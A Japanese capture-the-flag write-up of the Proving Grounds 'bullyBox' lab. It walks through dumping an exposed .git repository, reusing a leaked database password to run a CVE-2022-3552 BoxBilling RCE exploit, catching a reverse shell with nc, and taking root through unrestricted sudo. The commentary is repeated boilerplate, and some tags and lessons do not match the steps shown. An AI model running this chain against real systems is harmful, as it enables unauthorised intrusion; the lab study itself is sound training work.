---
title: "Proving Grounds - bullyBox (Linux)"
date: 2026-02-25
description: "Proving Grounds bullyBox Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-bullybox/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Webアプリケーションおよび公開されているネットワークサービス |
| 主な侵入経路 | Web RCE (CVE-2022-3552) |
| 権限昇格経路 | ローカル列挙 → 設定ミスの悪用 → root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か
このフェーズでは到達可能な攻撃対象領域をマッピングし、悪用が最も成功しやすい箇所を特定します。正確なサービスおよびコンテンツ探索により、闇雲なテストを減らし、標的を絞った後続アクションに繋げます。

## 初期足がかり

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,txt --dont-scan '/(css|fonts?|images?|img)/' -u http://bullybox.local
```

```bash
❌[17:06][CPU:15][MEM:42][TUN0:192.168.45.193][/home/n0z0/work]
🐉 > feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,txt --dont-scan '/(css|fonts?|images?|img)/' -u http://bullybox.local
                                                                                                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://bullybox.local
 🚫  Don't Scan Regex      │ /(css|fonts?|images?|img)/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 301, 302, 401, 403]
 💥  Timeout (secs)        │ 3
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        0w        1c http://bullybox.local/bb-data/
200      GET        5l       13w       92c http://bullybox.local/.git/config
200      GET        1l        2w       23c http://bullybox.local/.git/HEAD

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 /tools/git-dumper/git_dumper.py http://bullybox.local/.git/ /home/n0z0/work/pg/bullyBox
```

```bash
✅[17:12][CPU:18][MEM:41][TUN0:192.168.45.193][...ome/n0z0/work/pg/bullyBox]
🐉 > python3 /tools/git-dumper/git_dumper.py http://bullybox.local/.git/ /home/n0z0/work/pg/bullyBox 
/tools/git-dumper/git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
[-] Testing http://bullybox.local/.git/HEAD [200]
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat bb-config.php
```

```bash
❌[17:23][CPU:7][MEM:42][TUN0:192.168.45.193][...ome/n0z0/work/pg/bullyBox]
🐉 > cat bb-config.php 
<?php
return array (
  'debug' => false,
  'salt' => 'b94ff361990c5a8a37486ffe13fabc96',
  'url' => 'http://bullybox.local/',
  'admin_area_prefix' => '/bb-admin',
  'sef_urls' => true,
  'timezone' => 'UTC',
  'locale' => 'en_US',
  'locale_date_format' => '%A, %d %B %G',
  'locale_time_format' => ' %T',
  'path_data' => '/var/www/bullybox/bb-data',
  'path_logs' => '/var/www/bullybox/bb-data/log/application.log',
  'log_to_db' => true,
  'db' =>
  array (
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'Playing-Unstylish7-Provided',
  ),
  'twig' =>
  array (
    'debug' => true,
    'auto_reload' => true,
    'cache' => '/var/www/bullybox/bb-data/cache',
  ),
  'api' =>
  array (
    'require_referrer_header' => false,
    'allowed_ips' =>
    array (
    ),
    'rate_span' => 3600,
    'rate_limit' => 1000,
  ),
);       
```

![Screenshot from the bullybox engagement](/assets/img/pg/bullybox/Pasted%20image%2020251230204704.png)
*キャプション：このフェーズで取得したスクリーンショット*

https://github.com/0xk4b1r/CVE-2022-3552
![Screenshot from the bullybox engagement](/assets/img/pg/bullybox/Pasted%20image%2020251230214345.png)
*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 CVE-2022-3552.py -d http://bullybox.local -u admin@bullybox.local -p Playing-Unstylish7-Provided
```

```bash
✅[21:40][CPU:27][MEM:54][TUN0:192.168.45.193][...pg/bullyBox/CVE-2022-3552]
🐉 > python3 CVE-2022-3552.py -d http://bullybox.local -u admin@bullybox.local -p Playing-Unstylish7-Provided
[+] Successfully logged in
[+] Payload saved successfully
[+] Getting Shell

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
rlwrap -cAri nc -lvnp 1337
```

```bash
❌[21:40][CPU:16][MEM:55][TUN0:192.168.45.193][/home/n0z0/work]
🐉 > rlwrap -cAri nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.245.27] 58324
Linux bullybox 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 12:40:36 up  4:47,  0 users,  load average: 0.00, 0.00, 0.00
USER   
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
ls -la ~/
```

```bash
yuki@bullybox:/tmp$ ls -la ~/
total 20
drwxr-x--- 2 yuki yuki 4096 Jun 27  2023 .
drwxr-xr-x 3 root root 4096 Jun 27  2023 ..
lrwxrwxrwx 1 root root    9 Jun 27  2023 .bash_history -> /dev/null
-rw-r--r-- 1 yuki yuki  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 yuki yuki 3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 yuki yuki  807 Jan  6  2022 .profile
yuki@bullybox:/tmp$ 

```

💡 なぜ有効か
初期足がかりのステップでは、発見した脆弱性を連鎖させてターゲットを実行制御下に置きます。成功した足がかり技法は、コマンド実行またはインタラクティブシェルの取得によって検証されます。

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
sudo -l
sudo su -
at /root/proof.txt
cat /root/proof.txt
```

```bash
yuki@bullybox:/tmp$ sudo -l
Matching Defaults entries for yuki on bullybox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User yuki may run the following commands on bullybox:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
yuki@bullybox:/tmp$ sudo su -
root@bullybox:~# at /root/proof.txt
Command 'at' not found, but can be installed with:
apt install at
root@bullybox:~# cat /root/proof.txt
4f7df96de5839c732c8e1e19a389ccf6
root@bullybox:~# 

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog
/var/log/kern.log
/var/log/journal/43fddd5fdaac48989c811e81838aeb4d/user-1001.journal
/var/log/journal/43fddd5fdaac48989c811e81838aeb4d/system.journal
/var/log/vmware-vmsvc-root.log
/var/log/auth.log
/home/yuki/snap/lxd/common/config/config.yml
/home/yuki/.sudo_as_admin_successful
/home/yuki/.gnupg/pubring.kbx
/home/yuki/.gnupg/trustdb.gpg
```

💡 なぜ有効か
権限昇格は、ローカルの設定ミス・安全でないパーミッション・信頼された実行パスを利用します。これらの信頼境界を列挙して悪用することが、rootレベルのアクセスへの最短経路です。

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

## 参考文献

- CVE-2022-3552: https://nvd.nist.gov/vuln/detail/CVE-2022-3552
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
